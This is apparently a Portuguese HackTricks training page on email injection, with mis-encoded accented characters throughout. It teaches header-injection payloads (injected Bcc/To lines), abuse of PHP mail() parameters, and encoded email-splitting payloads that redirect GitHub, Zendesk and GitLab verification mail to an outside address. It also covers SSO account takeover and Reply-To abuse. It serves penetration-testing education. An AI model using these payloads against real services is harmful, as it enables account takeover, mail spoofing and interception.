# Inje√ß√µes de E-mail

{{#include ../banners/hacktricks-training.md}}

## Injetar em e-mail enviado

### Injetar Cc e Bcc ap√≥s o argumento do remetente
```
From:sender@domain.com%0ACc:recipient@domain.co,%0ABcc:recipient1@domain.com
```
A mensagem ser√° enviada para as contas de destinat√°rio e destinat√°rio1.

### Argumento de inje√ß√£o
```
From:sender@domain.com%0ATo:attacker@domain.com
```
A mensagem ser√° enviada ao destinat√°rio original e √† conta do atacante.

### Injetar argumento de Assunto
```
From:sender@domain.com%0ASubject:This is%20Fake%20Subject
```
O assunto falso ser√° adicionado ao assunto original e, em alguns casos, o substituir√°. Depende do comportamento do servi√ßo de e-mail.

### Mudar o corpo da mensagem

Injete uma quebra de linha dupla e, em seguida, escreva sua mensagem para alterar o corpo da mensagem.
```
From:sender@domain.com%0A%0AMy%20New%20%0Fake%20Message.
```
### Explora√ß√£o da fun√ß√£o mail() do PHP
```bash
# The function has the following definition:

php --rf mail

Function [ <internal:standard> function mail ] {
- Parameters [5] {
Parameter #0 [ <required> $to ]
Parameter #1 [ <required> $subject ]
Parameter #2 [ <required> $message ]
Parameter #3 [ <optional> $additional_headers ]
Parameter #4 [ <optional> $additional_parameters ]
}
}
```
#### O 5¬∫ par√¢metro ($additional_parameters)

Esta se√ß√£o ser√° baseada em **como abusar deste par√¢metro supondo que um atacante o controla**.

Este par√¢metro ser√° adicionado √† linha de comando que o PHP usar√° para invocar o bin√°rio sendmail. No entanto, ele ser√° sanitizado com a fun√ß√£o `escapeshellcmd($additional_parameters)`.

Um atacante pode **injetar par√¢metros adicionais para sendmail** neste caso.

#### Diferen√ßas na implementa√ß√£o de /usr/sbin/sendmail

A interface do **sendmail** √© **fornecida pelo software de e-mail MTA** (Sendmail, Postfix, Exim etc.) instalado no sistema. Embora a **funcionalidade b√°sica** (como os par√¢metros -t -i -f) permane√ßa a **mesma** por raz√µes de compatibilidade, **outras fun√ß√µes e par√¢metros** variam muito dependendo do MTA instalado.

Aqui est√£o alguns exemplos de diferentes p√°ginas de manual do comando/interface sendmail:

- Sendmail MTA: http://www.sendmail.org/\~ca/email/man/sendmail.html
- Postfix MTA: http://www.postfix.org/mailq.1.html
- Exim MTA: https://linux.die.net/man/8/eximReferences

Dependendo da **origem do bin√°rio sendmail**, diferentes op√ß√µes foram descobertas para abusar delas e **vazar arquivos ou at√© executar comandos arbitr√°rios**. Confira como em [**https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html**](https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html)

## Injetar no nome do e-mail

> [!CAUTION]
> Note que se voc√™ conseguir criar uma conta em um servi√ßo com um nome de dom√≠nio arbitr√°rio (como Github, Gitlab, CloudFlare Zero trust...) e verific√°-la recebendo o e-mail de verifica√ß√£o no seu endere√ßo de e-mail, voc√™ pode ser capaz de acessar locais sens√≠veis da empresa v√≠tima.

### Partes ignoradas de um e-mail

Os s√≠mbolos: **+, -** e **{}** em raras ocasi√µes podem ser usados para marca√ß√£o e ignorados pela maioria dos servidores de e-mail.

- Ex.: john.doe+intigriti@example.com ‚Üí john.doe@example.com

**Coment√°rios entre par√™nteses ()** no in√≠cio ou no final tamb√©m ser√£o ignorados.

- Ex.: john.doe(intigriti)@example.com ‚Üí john.doe@example.com

### Bypass de whitelist

<figure><img src="../images/image (812).png" alt="https://www.youtube.com/watch?app=desktop&v=4ZsTKvfP1g0"><figcaption></figcaption></figure>

### Cita√ß√µes

<figure><img src="../images/image (626).png" alt="https://www.youtube.com/watch?app=desktop&v=4ZsTKvfP1g0"><figcaption></figcaption></figure>

### IPs

Voc√™ tamb√©m pode usar IPs como nomes de dom√≠nio entre colchetes:

- john.doe@\[127.0.0.1]
- john.doe@\[IPv6:2001:db8::1]

### Codifica√ß√£o de E-mail

Como explicado em [**esta pesquisa**](https://portswigger.net/research/splitting-the-email-atom), nomes de e-mail tamb√©m podem conter caracteres codificados:

- **PHP 256 overflow**: A fun√ß√£o `chr` do PHP continuar√° adicionando 256 a um caractere at√© que se torne positivo e ent√£o far√° a opera√ß√£o `%256`.
- `String.fromCodePoint(0x10000 + 0x40) // êÅÄ ‚Üí @`

> [!TIP]
> O objetivo deste truque √© terminar com uma inje√ß√£o como `RCPT TO:<"collab@psres.net>collab"@example.com>`\
> que enviar√° o e-mail de verifica√ß√£o para um endere√ßo de e-mail diferente do esperado (portanto, para introduzir outro endere√ßo de e-mail dentro do nome do e-mail e quebrar a sintaxe ao enviar o e-mail).

Codifica√ß√µes diferentes:
```bash
# Format
=? utf-8 ? q ? =41=42=43 ?= hi@example.com --> ABChi@example.com

# =? -> Start of encode
# utf-8 -> encoding used
# ? -> separator
# q -> type of encoding
# ? -> separator
# =41=42=43 -> Hex encoded data
# ?= end of encoding

# Other encodings, same example:
#¬†iso-8859-1
=?iso-8859-1?q?=61=62=63?=hi@example.com
# utf-8
=?utf-8?q?=61=62=63?=hi@example.com
# utf-7
=?utf-7?q?<utf-7 encoded string>?=hi@example.com
# q encoding + utf-7
=?utf-7?q?&=41<utf-7 encoded string without initial A>?=hi@example.com
# base64
=?utf-8?b?QUJD?=hi@example.com
# bas64 + utf-7
=?utf-7?q?<utf-7 encoded string in base64>?=hi@example.com
#punycode
x@xn--svg/-9x6 ‚Üí x@<svg/
```
Payloads:

- Github: `=?x?q?collab=40psres.net=3e=00?=foo@example.com`
- Note o `@` codificado como =40, o `>` codificado como `=3e` e `null` como `=00`
- Ele enviar√° o email de verifica√ß√£o para `collab@psres.net`
- Zendesk: `"=?x?q?collab=22=40psres.net=3e=00==3c22x?="@example.com`
- Mesma t√©cnica de antes, mas adicionando uma aspa regular no in√≠cio e a aspa codificada `=22` antes do `@` codificado e, em seguida, iniciando e fechando algumas aspas antes do pr√≥ximo email para corrigir a sintaxe usada internamente pelo Zendesk
- Ele enviar√° o email de verifica√ß√£o para `collab@psres.net`
- Gitlab: `=?x?q?collab=40psres.net_?=foo@example.com`
- Note o uso do sublinhado como um espa√ßo para separar o endere√ßo
- Ele enviar√° o email de verifica√ß√£o para `collab@psres.net`
- Punycode: Usando Punycode, foi poss√≠vel injetar uma tag `<style` no Joomla e abusar dela para roubar o token CSRF via exfiltra√ß√£o de CSS.

#### Tooling

- H√° um **script do Burp Suite Turbo Intruder** para fuzz essas combina√ß√µes para tentar atacar formatos de email. O script j√° possui combina√ß√µes potencialmente funcionais.
- Tamb√©m √© poss√≠vel usar [Hackvertor](https://portswigger.net/bappstore/65033cbd2c344fbabe57ac060b5dd100) para criar um ataque de divis√£o de email

### Other vulns

![https://www.youtube.com/watch?app=desktop&v=4ZsTKvfP1g0](<../images/image (1131).png>)

## Third party SSO

### XSS

Alguns servi√ßos como **github** ou **salesforce permitem** que voc√™ crie um **endere√ßo de email com payloads XSS nele**. Se voc√™ puder **usar esses provedores para fazer login em outros servi√ßos** e esses servi√ßos **n√£o estiverem sanitizando** corretamente o email, voc√™ pode causar **XSS**.

### Account-Takeover

Se um **servi√ßo SSO** permitir que voc√™ **crie uma conta sem verificar o endere√ßo de email fornecido** (como **salesforce**) e depois voc√™ puder usar essa conta para **fazer login em um servi√ßo diferente** que **confia** no salesforce, voc√™ poder√° acessar qualquer conta.\
_Observe que o salesforce indica se o email fornecido foi ou n√£o verificado, mas a aplica√ß√£o deve levar em conta essa informa√ß√£o._

## Reply-To

Voc√™ pode enviar um email usando _**From: company.com**_ e _**Replay-To: attacker.com**_ e se qualquer **resposta autom√°tica** for enviada devido ao email ter sido enviado **de** um **endere√ßo interno**, o **atacante** pode ser capaz de **receber** essa **resposta**.

## Hard Bounce Rate

Certos servi√ßos, como AWS, implementam um limite conhecido como **Hard Bounce Rate**, tipicamente definido em 10%. Esta √© uma m√©trica cr√≠tica, especialmente para servi√ßos de entrega de email. Quando essa taxa √© excedida, o servi√ßo, como o servi√ßo de email da AWS, pode ser suspenso ou bloqueado.

Um **hard bounce** refere-se a um **email** que foi retornado ao remetente porque o endere√ßo do destinat√°rio √© inv√°lido ou n√£o existe. Isso pode ocorrer por v√°rias raz√µes, como o **email** sendo enviado para um endere√ßo inexistente, um dom√≠nio que n√£o √© real, ou a recusa do servidor do destinat√°rio em aceitar **emails**.

No contexto da AWS, se voc√™ enviar 1000 emails e 100 deles resultarem em hard bounces (devido a raz√µes como endere√ßos ou dom√≠nios inv√°lidos), isso significaria uma taxa de hard bounce de 10%. Atingir ou exceder essa taxa pode fazer com que o AWS SES (Simple Email Service) bloqueie ou suspenda suas capacidades de envio de email.

√â crucial manter uma baixa taxa de hard bounce para garantir um servi√ßo de email ininterrupto e manter a reputa√ß√£o do remetente. Monitorar e gerenciar a qualidade dos endere√ßos de email em suas listas de mala direta pode ajudar significativamente a alcan√ßar isso.

Para informa√ß√µes mais detalhadas, a documenta√ß√£o oficial da AWS sobre como lidar com bounces e reclama√ß√µes pode ser consultada em [AWS SES Bounce Handling](https://docs.aws.amazon.com/ses/latest/DeveloperGuide/notification-contents.html#bounce-types).

## References

- [https://resources.infosecinstitute.com/email-injection/](https://resources.infosecinstitute.com/email-injection/)
- [https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html](https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html)
- [https://drive.google.com/file/d/1iKL6wbp3yYwOmxEtAg1jEmuOf8RM8ty9/view](https://drive.google.com/file/d/1iKL6wbp3yYwOmxEtAg1jEmuOf8RM8ty9/view)
- [https://www.youtube.com/watch?app=desktop\&v=4ZsTKvfP1g0](https://www.youtube.com/watch?app=desktop&v=4ZsTKvfP1g0)

{{#include ../banners/hacktricks-training.md}}
